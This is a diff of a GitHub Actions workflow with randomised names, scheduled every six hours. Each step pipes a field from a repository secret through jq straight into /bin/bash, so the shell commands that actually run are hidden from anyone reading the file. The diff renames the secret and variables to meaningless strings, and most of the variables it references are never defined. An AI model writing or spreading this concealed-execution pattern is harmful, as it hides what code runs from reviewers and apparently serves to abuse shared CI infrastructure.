@@ -1,9 +1,9 @@
 name: fretfulpresident
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 3/6 * * *'
+    - cron: '42 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,24 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: fretfulpresident
         env:
-          fjaif27063: ${{ secrets.fjaif27063 }}
+          cat1: ${{ secrets.cat1 }}
         run: |
-          echo $fjaif27063 | jq -r .orf1271 | /bin/bash
-          echo $nx0 | jq -r .y638 | /bin/bash
-          echo $gxmgx932 | jq -r .ra33 | /bin/bash
-          echo $pr572 | jq -r .yznd166 | /bin/bash
-          echo $xxgk0 | jq -r .bm65 | /bin/bash
-          echo $xsjfa0055 | jq -r .ac9 | /bin/bash
-          echo $n66558 | jq -r .cxv697 | /bin/bash
-          echo $e043 | jq -r .mzk0 | /bin/bash
-          echo $zv8820 | jq -r .ldff2531 | /bin/bash
-          echo $npeod40590 | jq -r .eiw359 | /bin/bash
-          echo $gmsvz668 | jq -r .ik615 | /bin/bash
-          echo $lss77 | jq -r .uw8 | /bin/bash
-          echo $lbahw033 | jq -r .y8 | /bin/bash
-          echo $alw252 | jq -r .o22712 | /bin/bash
-          echo $hzit5 | jq -r .sn4996 | /bin/bash
-          echo $z35 | jq -r .xrx24869 | /bin/bash
-          echo $s15524 | jq -r .wvc345 | /bin/bash
-          echo $chi09832 | jq -r .qydte42488 | /bin/bash
+          echo $cat1 | jq -r .wwnte0 | /bin/bash
+          echo $zg0834 | jq -r .n17944 | /bin/bash
+          echo $dxtx6 | jq -r .yirq22 | /bin/bash
+          echo $bf7 | jq -r .wuj6572 | /bin/bash
+          echo $j2 | jq -r .dzqg163 | /bin/bash
+          echo $njghf246 | jq -r .cr22 | /bin/bash
+          echo $mhpe83774 | jq -r .qx7 | /bin/bash
 
